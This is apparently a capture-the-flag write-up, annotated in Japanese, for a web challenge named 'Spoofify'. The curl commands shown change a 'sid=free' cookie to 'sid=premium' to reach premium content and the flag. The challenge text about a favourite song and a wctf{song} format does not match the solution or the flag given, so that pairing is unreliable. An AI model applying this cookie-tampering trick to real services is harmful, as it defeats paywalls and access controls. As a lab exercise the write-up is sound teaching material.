## SPOOFIFY

100

What's the name of my favorite song?

H!hcsiH!hnrheiatcaedaeatetvaateqiesliohnemntealtteitrvlataltteoq'igeosalHi!oihgnhlaesnbsHi!ohvcosainHi!ohcnurnhreHi!altMcia,hcaposfhWs!iovoaniocunrH!lMiterdtltirltlto'goaH!igthioet

P.S. Use all lowercase for the flag, and replace spaces with dashes. Submit wctf{song}.

## Solution

```
localhost:~# curl -i https://spoofify-web.wolv
ctf-2026.kctf.cloud/
```

```
HTTP/2 200 
server: gunicorn
date: Sat, 21 Nov 2026 14:10:34 GMT
content-type: text/html; charset=utf-8
set-cookie: sid=free; Path=/
content-length: 2037
```

```
set-cookie: sid=free
```
ここを書き換えればよさそう

```
localhost:~# curl -i -b "sid=premium" https://
spoofify-web.wolvctf-2026.kctf.cloud
```

```
    <p>Welcome, Premium listener. No ads, offline downloads, and your
       exclusive unlock code for this week's unreleased drop:</p>
    <div class="flagbox"><code>wctf{pr3m1um_pl4yl1st_n0_p4ym3nt_n33ded}</code></div>

wctf{pr3m1um_pl4yl1st_n0_p4ym3nt_n33ded}
```
でた

## Flag
```
wctf{pr3m1um_pl4yl1st_n0_p4ym3nt_n33ded}
```